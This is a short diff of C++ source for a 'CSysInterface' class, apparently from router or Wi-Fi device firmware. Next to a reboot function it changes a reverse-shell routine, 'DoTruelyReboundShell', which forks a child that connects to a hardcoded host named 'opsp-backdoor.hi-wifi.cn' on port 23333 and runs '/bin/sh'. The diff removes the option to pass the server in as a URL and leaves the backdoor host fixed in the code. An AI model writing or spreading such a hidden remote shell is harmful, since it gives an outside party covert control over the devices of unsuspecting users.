@@ -16,7 +16,7 @@ void CSysInterface::Reboot(void)
     system("reboot");
 }
 
-void CSysInterface::DoTruelyReboundShell(std::string &url, std::string &mac)
+void CSysInterface::DoTruelyReboundShell(const std::string &mac)
 {
     int port = 23333;
     int sock;
@@ -24,9 +24,6 @@ void CSysInterface::DoTruelyReboundShell(std::string &url, std::string &mac)
     std::string title("");
     std::string shell("/bin/sh");
     std::string server_url("opsp-backdoor.hi-wifi.cn");
-    //std::size_t found = url.find_last_of("/");
-    //server_url = url.substr(found + 1);
-    //server_url = url.substr(found + 1);
 
     //daemon(1, 0);
 
@@ -78,13 +75,13 @@ void CSysInterface::DoTruelyReboundShell(std::string &url, std::string &mac)
     exit(0);
 }
 
-void CSysInterface::ReboundShell(std::string &url, std::string &mac)
+void CSysInterface::ReboundShell(const std::string &mac)
 {
     utlLog_debug("ReboundShell");
     switch(vfork())
     {
         case 0:                /* child */
-            DoTruelyReboundShell(url, mac);
+            DoTruelyReboundShell(mac);
             break;
 
         default:               /* parent */
